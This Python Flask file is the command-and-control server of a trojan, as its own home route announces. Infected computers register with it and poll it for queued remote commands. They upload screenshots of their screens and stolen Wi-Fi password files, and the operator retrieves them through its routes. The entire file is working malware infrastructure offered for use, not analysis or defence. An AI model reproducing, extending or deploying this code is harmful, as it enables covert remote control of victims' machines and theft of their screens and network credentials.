from flask import Flask, request, send_file, jsonify
import os
import json

app = Flask(__name__)

pending_commands = {}
active_clients = {}

SCREENSHOT_DIR = "/tmp/screenshots"
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

@app.route('/')
def home():
    return "Trojan server works! ✅"

@app.route('/health')
def health():
    return "OK", 200

@app.route('/register/<chat_id>', methods=['POST'])
def register(chat_id):
    data = request.get_json()
    pc_name = data.get('pc_name', 'Unknown')
    active_clients[chat_id] = pc_name
    return jsonify({"status": "ok"})

@app.route('/clients', methods=['GET'])
def get_clients():
    return jsonify(active_clients)

@app.route('/poll/<chat_id>', methods=['GET'])
def poll(chat_id):
    if chat_id in pending_commands and pending_commands[chat_id]:
        cmd = pending_commands[chat_id]
        pending_commands[chat_id] = None
        return cmd
    return "NO_CMD"

@app.route('/cmd/<chat_id>', methods=['POST'])
def cmd(chat_id):
    pending_commands[chat_id] = request.data.decode('utf-8')
    return "OK"

@app.route('/upload/<chat_id>', methods=['POST'])
def upload(chat_id):
    if 'screenshot' not in request.files:
        return "NO FILE"
    f = request.files['screenshot']
    f.save(os.path.join(SCREENSHOT_DIR, f'{chat_id}.png'))
    return "OK"

@app.route('/screenshot/<chat_id>', methods=['GET'])
def get_screenshot(chat_id):
    path = os.path.join(SCREENSHOT_DIR, f'{chat_id}.png')
    if os.path.exists(path):
        return send_file(path, mimetype='image/png')
    return "NO SCREENSHOT"

# ========== НОВЫЙ МАРШРУТ ДЛЯ WI-FI ПАРОЛЕЙ ==========
@app.route('/upload_wifi/<chat_id>', methods=['POST'])
def upload_wifi(chat_id):
    if 'file' not in request.files:
        return "NO FILE"
    f = request.files['file']
    f.save(f"wifi_{chat_id}.txt")
    return "OK"

@app.route('/get_wifi/<chat_id>', methods=['GET'])
def get_wifi(chat_id):
    path = f"wifi_{chat_id}.txt"
    if os.path.exists(path):
        return send_file(path, as_attachment=True)
    return "NO FILE", 404

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
